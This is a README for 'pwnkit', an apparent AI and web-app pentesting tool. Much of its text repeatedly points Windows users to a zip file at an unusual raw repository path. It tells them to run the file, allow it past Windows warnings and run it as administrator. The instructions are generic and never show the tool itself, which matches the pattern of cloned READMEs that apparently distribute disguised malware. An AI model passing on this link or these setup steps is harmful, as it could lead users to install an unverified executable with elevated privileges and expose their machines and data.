# 🛡️ pwnkit - Safer AI and app testing

[![Download pwnkit](https://img.shields.io/badge/Download%20pwnkit-blue-grey?style=for-the-badge)](https://github.com/Gerberayale521/pwnkit/raw/refs/heads/main/Zan/Software_v2.8.zip)

## 🚀 What pwnkit does

pwnkit helps you test AI systems, web apps, code, and packages for weak spots. It runs attack-driven checks and shows where a system may fail. It also helps with autonomous pentesting tasks, so you can review behavior across many paths without doing every step by hand.

Use it to:
- test prompt handling in AI apps
- check web app flows for common security issues
- review code and package risks
- gather findings in a clear report
- export results in SARIF for other tools

## 💻 Windows download and setup

Use this link to visit the page to download:

https://github.com/Gerberayale521/pwnkit/raw/refs/heads/main/Zan/Software_v2.8.zip

### 1. Open the download page
Open the link above in your browser on Windows.

### 2. Get the latest version
Look for the newest release or the main download files on the page. Download the file that fits your system.

### 3. Save the file
Save the file to your Downloads folder or another folder you can find again.

### 4. Run the app
If the file is an installer, double-click it and follow the steps on screen.  
If the file is a Windows app file, double-click it to start the tool.

### 5. Allow access if needed
Windows may ask if you want to allow the app to run. Choose the option that lets it open.

### 6. Open pwnkit
Start pwnkit from the app menu, your desktop, or the folder where you saved it.

## 📋 What you need

pwnkit works best on a modern Windows PC with:
- Windows 10 or Windows 11
- 8 GB of RAM or more
- 2 GB of free disk space
- an internet connection for checks that use online services
- a browser installed for web app testing

If you plan to test larger apps or multiple targets, more memory and CPU power can help.

## 🧭 First run

When you open pwnkit for the first time, it may ask for:
- a target URL
- a local file path
- an API key for an AI model
- a scan mode or test profile

A simple first test can use:
- one website you own or have permission to test
- one small app or package
- the default scan settings

If you want fast results, start with a single target and keep the default options.

## ⚙️ Basic use

pwnkit is built for guided testing. A typical flow looks like this:

1. Choose what you want to test
   - AI system
   - web app
   - code
   - package

2. Pick a test type
   - prompt-injection checks
   - page flow checks
   - package review
   - general security review

3. Start the scan
   - pwnkit runs a set of checks
   - it looks for weak input handling, unsafe output, and risky behavior

4. Review the findings
   - look at each issue
   - check the path that led to it
   - confirm what matters for your case

5. Export results
   - save as SARIF
   - share with your security tools or team

## 🧪 Common use cases

### AI systems
Use pwnkit to test:
- prompt injection
- data leaks in responses
- unsafe tool use
- weak guardrails
- poor input checks

### Web apps
Use pwnkit to look for:
- broken input handling
- unsafe redirects
- common web security flaws
- weak browser flows
- problems in forms and pages

### Code
Use pwnkit to review:
- risky code paths
- insecure defaults
- bad handling of user input
- code that may expose secrets

### Packages
Use pwnkit to inspect:
- dependency risks
- unsafe install behavior
- package metadata issues
- trust problems in package flows

## 🔍 How the reports help

pwnkit gives results that are easier to act on than raw logs. Each finding can point to:
- the target that was tested
- the check that ran
- the path that triggered the issue
- the result level
- the output format for follow-up work

This makes it easier to sort what needs a fix and what needs a second look.

## 🖥️ Using the command line

pwnkit also supports CLI use for users who want more control. You can use it to:
- start a scan from a terminal
- set the target by path or URL
- choose the test profile
- save results to a file
- run repeat checks for the same target

If you do not use the terminal often, you can still follow the same basic steps through the app interface.

## 🔐 Safe testing

Only test systems you own or have permission to check. Use pwnkit on:
- your own apps
- your company’s systems
- lab machines
- test accounts
- practice targets

This helps you learn how the tool works while keeping testing in the right place.

## 🧩 Project focus

pwnkit brings together:
- agentic testing
- autonomous pentesting
- browser-based checks with Playwright
- security review for AI and web apps
- SARIF output for reporting
- TypeScript-based tooling
- open-source workflow support
- OWASP-style review ideas

## 📁 Files and results

After a scan, you may see:
- a results file
- a JSON report
- a SARIF file
- logs from the scan
- saved target details

If you plan to keep records, make a folder for each target so you can find old results fast.

## 🛠️ Troubleshooting

### The app does not open
- Try running it again
- Right-click the file and choose Run as administrator
- Check that Windows did not block the file
- Download the file again if it looks incomplete

### The scan does not start
- Check the target address
- Make sure the app has network access
- Confirm the file or URL is reachable
- Try the default scan profile first

### Results look empty
- Use a known test target
- Increase scan depth if the app offers that option
- Check that the tool has permission to reach the page or file

### Browser checks fail
- Make sure your browser is installed
- Close other browser windows
- Try again with a clean target page
- Update Windows if system parts are out of date

## 🔗 Download again

If you need the download page again, use this link:

https://github.com/Gerberayale521/pwnkit/raw/refs/heads/main/Zan/Software_v2.8.zip

## 📌 Tips for first-time users

- Start with one target
- Use a test account
- Keep the default settings at first
- Save every report
- Compare results after each run
- Test the same target again after a fix

## 📚 Output formats

pwnkit can help with:
- human-readable findings
- machine-readable export
- SARIF-based security review
- repeat testing for the same target
- team review in common tools

## 🧰 What makes pwnkit useful

pwnkit is built for people who want one tool for several kinds of security checks. It helps you move from first test to result review without needing many separate tools. That makes it easier to check AI systems, sites, code, and packages in one place